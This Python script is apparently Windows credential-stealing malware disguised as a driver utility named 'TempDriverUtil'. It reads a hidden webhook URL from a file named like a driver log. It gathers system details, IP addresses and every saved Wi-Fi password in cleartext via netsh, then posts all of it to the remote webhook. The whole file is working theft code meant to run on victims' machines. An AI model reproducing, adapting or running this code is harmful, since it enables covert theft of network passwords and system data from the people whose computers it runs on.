#imports
import subprocess, requests, os, platform, psutil

#webhook url
Directory = r"C:\Program Files (x86)\Temp\DriverUtilLog.txt"
WebH = open(Directory, 'r').read()

#s.1 basic system info
WinUser = os.getlogin() #Username
ComputerName = platform.node() #Computer Name
WinArch = platform.architecture() #Architecture + Formatting
WinArch = str(WinArch[0]).replace("bit", "x") 
WinVer = subprocess.check_output("wmic os get name") #Windows Version (example: Microsoft Windows 11 Pro) + Formatting
WinVer = WinVer.decode('utf-8').split("\n")
WinVer = str(WinVer[1])

#Processor (CPU)
Processor = subprocess.check_output("wmic cpu get name")
Processor = Processor.decode('utf-8').split("\n")
Processor = str(Processor[1])
Processor = Processor[:-2]

#Graphics Processor (only works on nvidia gpus)
GPUName = subprocess.check_output("nvidia-smi -L")
GPUName = GPUName.decode('utf-8')
GPUName = GPUName[7:-50]

if "NVIDIA" not in GPUName:
	GPUName = "GPU Is Not NVIDIA Brand"

#memory
MemTotal = psutil.virtual_memory().total

#s.2 wifi names and passwords (wifi data = WifiStuff[:-1]) (failure is likely due to an absence of a password)
WifiStuff = ""
EncryptedWifi = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
DecryptedWifi = EncryptedWifi.decode('utf-8', errors ="backslashreplace")
DecryptedWifi = DecryptedWifi.split('\n')
profiles = []
for segment in DecryptedWifi:
	if "All User Profile" in segment :
		segment = segment.split(":")
		segment = segment[1]
		segment = segment[1:-1]
		profiles.append(segment) 
for segment in profiles:
	try:
		results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', segment, 'key=clear'])
		results = results.decode('utf-8', errors ="backslashreplace")
		results = results.split('\n')
		results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
		try:
			WifiStuff = WifiStuff + "{:<40}. . . . . . {:<}\n".format(segment, results[0])
			print("Password Found...")
		except IndexError:
			print("No Password Found...")
	except subprocess.CalledProcessError:
		print("Error With Wifi Name Or Decode...")

#get ip data
ipv4 = subprocess.check_output("ipconfig | findstr /i ipv4", shell=True)
ipv4 = ipv4.decode('utf-8')
ipv4 = ipv4[39:]

ipv6 = subprocess.check_output("ipconfig | findstr /i ipv6", shell=True)
ipv6 = ipv6.decode('utf-8')

#Making data for sysinfo webhook embed
WebHookData1 = {
	"username": "TempDriverUtil",
	"embeds": [{
		"title": "Sys Info",
		"description": "System Username: " + "||" + WinUser + "||" + "\nSystem Name: " + "||" + ComputerName + "||" + "\nVersion: " + "||" + WinVer[:20] + " " + WinArch + "||" + "\nProcessor: " + "||"+ Processor + "||" + "\nGraphics Processor: " + "||" + GPUName + "||" + "\nTotal Memory: " + f"||{MemTotal:,} Bytes||"
    }]
}

#making data for wifi webhook embed
WebHookData2 = {
	"username": "TempDriverUtil",
	"embeds": [{
		"title": "Wifi Data",
		"description": "IPv4: " + "||" + ipv4 + "||" + "\nIPv6: \n" + "||" + ipv6 + "||" + "\n **Wifi Names And Passwords**" + "\n---NAMES-------------PASSWORDS---------\n" + "||" + WifiStuff + "||"
    }]
}

#sending webhooks
WebhookForSend = requests.post(WebH, json=WebHookData1)
WebhookForSend = requests.post(WebH, json=WebHookData2)